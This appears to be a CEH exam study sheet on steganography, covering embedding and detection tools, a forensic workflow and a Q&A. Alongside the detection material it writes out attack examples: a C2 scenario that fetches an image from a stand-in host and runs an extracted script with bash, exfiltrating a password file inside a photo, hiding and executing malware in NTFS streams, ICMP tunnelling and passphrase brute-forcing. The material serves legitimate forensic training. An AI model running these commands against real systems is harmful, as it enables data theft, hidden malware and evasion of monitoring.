Definition

Steganography = hiding the existence of secret data inside an ordinary file (carrier). The observer has no idea a hidden message exists.

Cryptography = hiding the meaning of data. The ciphertext is visible — just unreadable.

Three key objects

Carrier (cover): the innocent host file — image, audio, video, doc

Payload (secret): the hidden data — text, file, creds, keys

Stego object: the output — looks identical to carrier, carries payload

Stego vs Crypto vs Combined

Key exam rule: Steganography = hide existence · Cryptography = hide meaning · Steghide combines both (AES-128 encrypts payload before embedding).
LSB — how it works
Least Significant Bit insertion (most common technique)
# Each pixel = 3 bytes (R, G, B). Changing the last bit shifts colour by 1/255 — invisible. # To hide 'A' (01000001) we modify LSBs of 8 consecutive channel bytes: R: 11001010 → 11001010 (bit=0, no change) G: 00100110 → 00100111 (bit=1, LSB set to 1) B: 11010111 → 11010110 (bit=0, LSB set to 0) R: 11001010 → 11001010 (bit=0) G: 10110101 → 10110100 (bit=0) B: 00001111 → 00001111 (bit=0) R: 11010100 → 11010100 (bit=0) G: 11001011 → 11001011 (bit=1) # Capacity: 1 bpp — 1MP image (3 channels) can hold ~375 KB of data

Best carrier for LSB: PNG or BMP (lossless — preserves all bits). Avoid JPEG — lossy compression destroys LSB data on save.

Steghide — embed & extract
# Embed secret file into image steghide embed -cf cover.jpg -sf secret.txt -p "passphrase" # Embed with no passphrase steghide embed -cf cover.jpg -sf secret.txt -p "" # Extract hidden data steghide extract -sf stego.jpg -p "passphrase" # Extract to specific output file steghide extract -sf stego.jpg -p "pass" -xf out.txt # Info — check if file has stego (no extract) steghide info stego.jpg # Embed in WAV audio steghide embed -cf audio.wav -sf secret.txt -p "pass" # Flags: -cf cover -sf secret -p passphrase -xf output file
Detection — binwalk & strings
# Binwalk — find embedded files binwalk stego.jpg binwalk -e stego.jpg # Auto-extract embedded binwalk --dd='.*' stego.jpg # Extract all signatures # Strings — extract readable text strings stego.jpg strings stego.jpg | grep -i "password\|flag\|secret\|key" strings -n 8 stego.jpg # Min 8 char strings # file — verify real file type file stego.jpg # xxd — hex dump (check EOF area) xxd stego.jpg | head -5 # Check magic bytes xxd stego.jpg | tail -20 # Check after EOF marker
ExifTool — metadata
# Read all metadata exiftool stego.jpg # Read specific fields exiftool -Comment -Author stego.jpg # Write hidden data into Comment field exiftool -Comment="hidden message" stego.jpg # Remove all metadata exiftool -all= stego.jpg # Check GPS coordinates (geolocation leak) exiftool -gpslatitude -gpslongitude stego.jpg
Stegdetect & zsteg
# Stegdetect — JPEG stego detection stegdetect stego.jpg stegdetect -t jopifyb stego.jpg # All algorithms # j=jsteg o=outguess p=jphide # f=F5 i=invisible y=steghide b=brothasoft # Stegbreak — dictionary attack on passphrase stegbreak -t p -f rockyou.txt stego.jpg # zsteg — PNG/BMP LSB analysis zsteg stego.png zsteg -a stego.png # All channels & methods zsteg -E "b1,rgb,lsb,xy" stego.png # Extract specific channel
Snow — whitespace steganography
# Embed message in text file snow -C -m "secret message" -p "pass" cover.txt stego.txt # Extract message snow -C -p "pass" stego.txt # Without password snow -C -m "hello" cover.txt stego.txt snow -C stego.txt # Flags: -C compress -m message -p password -l line length
Foremost & file carving
# Foremost — recover embedded files foremost -i stego.jpg -o output_dir/ foremost -t jpg,png,pdf -i disk.img -o carved/ # Magic bytes (file signatures): # JPEG : FF D8 FF # PNG : 89 50 4E 47 0D 0A 1A 0A # GIF : 47 49 46 38 (GIF8) # ZIP : 50 4B 03 04 # PDF : 25 50 44 46 (%PDF) # ELF : 7F 45 4C 46 # RAR : 52 61 72 21
Quick flag reminder — Steghide: -cf cover file · -sf secret file · -p passphrase · -xf output file · embed / extract / info
Detection methods
Visual analysis

Compare original vs. suspect file. Look for subtle colour banding, unusual noise patterns, or artefacts invisible in normal view. StegSolve displays individual bit planes — LSB stego often shows visible patterns in the bit-0 plane that the clean original does not.

Structural analysis

Check file size — unexpected increase suggests embedded content. Inspect hex dump for data appended after the EOF marker (FF D9 for JPEG). A file with extra bytes after EOF almost always contains hidden content.

Statistical — chi-square test

LSB insertion disrupts natural colour value distribution. In a clean image, adjacent value pairs (200, 201) occur with different frequencies. After LSB stego, these pairs become unnaturally equal. Stegdetect and zsteg automate this test.

Signature analysis

Stego tools leave identifiable markers — header modifications, tool-specific patterns, or unused field values. Stegdetect maintains a database of JPEG stego signatures. Binwalk uses magic bytes to detect embedded file types.

Investigation workflow — step by step
7-step forensic process
# Step 1 — Identify real file type file suspicious.jpg # Step 2 — Check metadata for hidden strings exiftool suspicious.jpg # Step 3 — Scan for embedded files binwalk suspicious.jpg binwalk -e suspicious.jpg # Extract if found # Step 4 — Extract strings strings suspicious.jpg | grep -i "flag\|pass\|key\|secret" # Step 5 — Run steganalysis stegdetect suspicious.jpg # JPEG → signatures zsteg suspicious.png # PNG/BMP → LSB analysis # Step 6 — Attempt extraction steghide extract -sf suspicious.jpg -p "" steghide extract -sf suspicious.jpg -p "password" stegbreak -t p -f rockyou.txt suspicious.jpg # Brute passphrase # Step 7 — Hex inspection xxd suspicious.jpg | tail -30 # Data after EOF? xxd suspicious.jpg | grep "FF D9" # Locate JPEG end marker

Data exfiltration via image

Insider embeds stolen data in holiday photos and uploads to social media — bypassing DLP controls that only inspect obvious file types.

# Attacker side — embed stolen DB dump steghide embed -cf cat.jpg -sf passwords.txt -p "P@ss!" # Upload cat.jpg to Imgur / send via email # Accomplice side — extract steghide extract -sf cat.jpg -p "P@ss!"

Detection: DLP image inspection, file size anomaly, stegdetect on uploads

C2 communication via image

Malware downloads images from a public site — commands are hidden inside the image content, bypassing network monitoring.

# C2 posts updated command in banner.png # Malware on victim polls and downloads: wget http://c2.example.com/banner.png steghide extract -sf banner.png -p "key" bash extracted_cmd.sh

Detection: Unusual outbound HTTP GET patterns to image hosting, baseline traffic analysis

NTFS ADS — malware hiding
# Hide executable in ADS of a txt file type malware.exe > legit.txt:hidden.exe # Execute from ADS wmic process call create "c:\legit.txt:hidden.exe" start "" "c:\legit.txt:hidden.exe" # Detect dir /r legit.txt Get-Item legit.txt -Stream * # Remove Remove-Item legit.txt -Stream hidden.exe
Network covert channel (ICMP)

Encode data in normally-ignored TCP/IP header fields (TTL, IP ID, ICMP payload) to create a covert channel through firewalls.

# ptunnel — TCP tunnel over ICMP ptunnel -p <proxy> -lp 8000 -da <dest> -dp 22 # covert_tcp — use IP ID field covert_tcp -dest <target> -source <src> -source_port 80 -dest_port 9999 -file secret.txt # Detection: ICMP traffic with unusual payload size # or high ICMP volume from single host
Forensic tip: When investigating suspected steganographic exfiltration, always check: (1) file size vs resolution ratio, (2) data appended after EOF marker, (3) EXIF metadata fields, (4) NTFS ADS on Windows hosts, (5) unusual outbound traffic to image hosting services.

#QuestionAnswer
Q1What is the primary difference between steganography and cryptography?Steganography hides the existence of data; cryptography hides the meaning of data
Q2Why is PNG preferred over JPEG for LSB steganography?PNG is lossless — preserves all pixel values. JPEG lossy compression re-encodes pixels and destroys LSB data
Q3Command to embed secret.txt into cover.jpg with password "pass"?steghide embed -cf cover.jpg -sf secret.txt -p "pass"
Q4Command to extract from stego.jpg with password "pass"?steghide extract -sf stego.jpg -p "pass"
Q5Which tool detects steganography in JPEG files?Stegdetect — identifies JSteg, OutGuess, JPHide, F5, steghide
Q6Which tool detects LSB stego in PNG/BMP?zsteg — run zsteg -a image.png for all channels
Q7What Windows feature hides files inside other files without stego tools?NTFS Alternate Data Streams — file.txt:hidden.exe
Q8A JPEG is 3 MB larger than expected. What is your first command?file suspicious.jpg → binwalk suspicious.jpg → exiftool suspicious.jpg
Q9What statistical test detects LSB steganography?Chi-square test — measures unnatural equalisation of adjacent colour value pairs
Q10How does Steghide protect data beyond just hiding it?It encrypts the payload with AES-128 before embedding — extracted data is still encrypted without the passphrase
Q11What is a fragile watermark used for?Detecting image tampering — any modification destroys the mark, proving the image has been altered
Q12Which tool performs a dictionary attack on a steganographic passphrase?Stegbreak — stegbreak -t p -f rockyou.txt image.jpg
Exam strategy: CEH practical stego tasks typically ask you to (1) embed a file using Steghide or OpenStego, (2) extract hidden data from a provided image, or (3) use Binwalk/Stegdetect to confirm hidden content exists. Master Steghide flags first — they appear most frequently in lab tasks. Always run steghide info before attempting extraction to confirm stego is present.
